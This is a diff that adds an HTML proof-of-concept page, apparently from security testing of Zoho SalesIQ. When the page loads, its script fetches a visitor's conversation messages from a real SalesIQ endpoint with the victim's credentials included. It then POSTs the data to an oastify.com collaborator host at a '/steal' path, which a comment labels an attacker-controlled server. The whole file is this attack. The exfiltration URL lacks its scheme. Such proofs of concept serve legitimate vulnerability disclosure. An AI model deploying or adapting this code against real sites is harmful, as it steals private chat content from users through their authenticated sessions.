@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://salesiq.localzoho.com/visitor/v2/summada/conversations/siqc18d38b3afe63d4c8eb1845029fbf7927793eb9d1b04d025168f7addd2503e04/messages?app_id=siqff3cfc9d756a12ab0fc275daae755f9b0cde8fc697fe5c98ed1785149ce53926&avuid=006144b0-7214-4fde-8f1f-8052a643dc9e&from=bottom&limit=100", {
+        credentials: "include"
+      })
+      .then(response => response.json())
+      .then(data => {
+        // send data to attacker-controlled server
+        fetch("ao2za0040bmjxwskolmvxqem4da4yvmk.oastify.com/steal", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+      });
+    </script>
+  </body>
+</html>
